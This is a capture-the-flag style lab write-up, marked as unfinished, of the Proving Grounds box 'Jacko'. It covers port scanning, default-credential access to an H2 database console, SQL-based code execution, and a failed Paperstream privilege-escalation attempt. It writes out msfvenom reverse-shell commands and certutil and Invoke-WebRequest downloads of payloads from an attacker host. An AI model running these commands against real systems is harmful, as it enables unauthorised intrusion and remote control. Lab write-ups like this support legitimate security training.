---
Date: 2024-10-28
Platform: PG-Practice
Category: Windows
Difficulty: Intermediate
Status: In progress
IP: 192.168.194.66
Writeup: https://medium.com/@Dpsypher/proving-grounds-practice-jacko-d42c9c1e7f9e
---
# Box


# Resolution summary

## Improved skills
- skill 1
- skill 2
## Used tools
- nmap
- python

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -p- -T5 -vvv -oN jacko.nmap 192.168.182.66
---
PORT      STATE    SERVICE         REASON
80/tcp    open     http            syn-ack ttl 125
135/tcp   open     msrpc           syn-ack ttl 125
139/tcp   open     netbios-ssn     syn-ack ttl 125
445/tcp   open     microsoft-ds    syn-ack ttl 125
5040/tcp  open     unknown         syn-ack ttl 125
8082/tcp  open     blackice-alerts syn-ack ttl 125
9092/tcp  open     XmlIpcRegSvc    syn-ack ttl 125
39980/tcp filtered unknown         no-response
49664/tcp open     unknown         syn-ack ttl 125
49665/tcp open     unknown         syn-ack ttl 125
49666/tcp open     unknown         syn-ack ttl 125
49667/tcp open     unknown         syn-ack ttl 125
49668/tcp open     unknown         syn-ack ttl 125
49669/tcp open     unknown         syn-ack ttl 125
61417/tcp filtered unknown         no-response
```

Enumerated open TCP ports:
```bash
sudo nmap -p 80,135,139,445,5040,8082,9082,61417 -A 192.168.182.66 -oN jacko-ports.nmap -v
---
PORT      STATE  SERVICE       VERSION
80/tcp    open   http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: H2 Database Engine (redirect)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds?
5040/tcp  open   unknown
8082/tcp  open   http          H2 database http console
| http-methods: 
|_  Supported Methods: GET POST
|_http-favicon: Unknown favicon MD5: D2FBC2E4FB758DC8672CDEFB4D924540
|_http-title: H2 Console
9082/tcp  closed unknown
61417/tcp closed unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=10/28%OT=80%CT=9082%CU=41631%PV=Y%DS=4%DC=T%G=Y%TM=
OS:671F6F8E%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=I%CI=I%TS=U)S
OS:EQ(SP=101%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=101%GCD=1%ISR=10C%TI=I%CI=
OS:I%TS=U)SEQ(SP=FF%GCD=1%ISR=10B%TI=I%CI=I%TS=U)OPS(O1=M578NW8NNS%O2=M578N
OS:W8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578NW8NNS%O6=M578NNS)WIN(W1=FFFF%W2=F
OS:FFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NN
OS:S%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%
OS:T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-10-28T11:03:30
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```
---
# Enumeration

## Port 80 - HTTP (H2 Database)
Navigated to `http://192.168.182.66:80` and identified default page for `H2 Database Engine`
![[Pasted image 20241028212111.png]]
## Port 135 - MSRPC (Windows RPC)

## Port 139 & 445 - SMB (Apache)

## Port 5040 - Unknown
## Port 8082 - H2
- Navigated to `http://192.168.194.66:8082` and identified `H2` login
![[Pasted image 20241029150929.png]]
- Attempted connection with default credentials `sa:` (No password) and accessed admin panel
![[Pasted image 20241029151022.png]]
- Ran SQL query `SELECT FILE_READ('C:\Windows\system.ini', NULL);` to test file read ability
![[Pasted image 20241029151354.png]]
 - ## Port 9092 - Unknown
- Navigated to `http://192.168.194.66:9092` and identified unknown service
![[Pasted image 20241029150455.png]]
- Saved page and displayed with correct encoding
![[Pasted image 20241029150806.png]]

---
# Exploitation
## SQL Injection
Ran `searchsploit "H2"` and identified exploit `49384.txt` to compile and run Java code on target for code execution
![[Pasted image 20241028215150.png]]
- Copied Java script from exploit into SQL statement and ran
![[Pasted image 20241029151723.png]]
- Copied native library script into SQL statement and ran
![[Pasted image 20241029151804.png]]
- Copied script evaluation into SQL statement and ran with command `whoami` to test - identified user `jacko/tony`
![[Pasted image 20241029151921.png]]
- Ran `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.162 LPORT=4444 -f exe > revshell.exe` to create reverse shell executable
![[Pasted image 20241029152945.png]]
- Ran `python3 -m http.server 80` to offer `revshell.exe` on HTTP server
- Returned to SQL statement and edited command to `certutil -split -urlcache -f http://192.168.45.162/revshell.exe C:\\Users\\tony\\revshell2.exe` to copy reverse shell to user `tony`
![[Pasted image 20241029153124.png]]
- Started Netcat listener on port `4444`, and ran SQL statement with command `C:\\Users\\tony\\revshell2.exe` and received reverse shell 
![[Pasted image 20241029154139.png]]
---
# Lateral Movement to user
## Local Enumeration
- Ran `type C:\Users\tony\desktop\local.txt` to print `988d8a67a549358c69a1cab88b594883`
![[Pasted image 20241029154446.png]]
- Navigated to `C:\Windows\system32` and ran `whoami /priv` - identified `SeImpersonatePrivilege` is `Enabled`
![[Pasted image 20241029154741.png]]
- Ran `systeminfo` and identified `Windows 10 Build 18363` on `x64` architecture
![[Pasted image 20241029155127.png]]
- Ran `set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;` to fix error with file path
![[Pasted image 20241029180455.png]]
- Ran `powershell -ep bypass` to start `Powershell` with scripts allowed

---
# Privilege Escalation
- Enumerated host programs and identified `Paperstream IP`
![[Pasted image 20241029181039.png]]
- Ran `searchsploit "Paperstream"` - identified & copied exploit `49382.ps1`
![[Pasted image 20241029181138.png]]
- Updated `49382.ps1` to save `shell.dll` to `C:\Users\tony\`
![[Pasted image 20241029181316.png]]
- Ran `msfvenom -p windows/x64/shell_reverse_tcp -f dll -o shell.dll LHOST=192.168.45.162 LPORT=4444` to generate `shell.dll` file
- Ran `iwr -uri http://192.168.45.162/shell.dll -outfile shell.dll` & `iwr -uri http://192.168.45.162/49382.ps1 -outfile paperstreamexploit.ps1` to copy `shell.dll` & `paperstreamexploit.ps1` into `C:\Users\tony` directory from http server
![[Pasted image 20241029181732.png]]
- Started netcat listener and ran `.\paperstreamexploit.ps1` - payload triggered but no reverse shell received
![[Pasted image 20241029181902.png]]

---
# Trophy & Loot
`local.txt` = `988d8a67a549358c69a1cab88b594883`
`proof.txt` = ``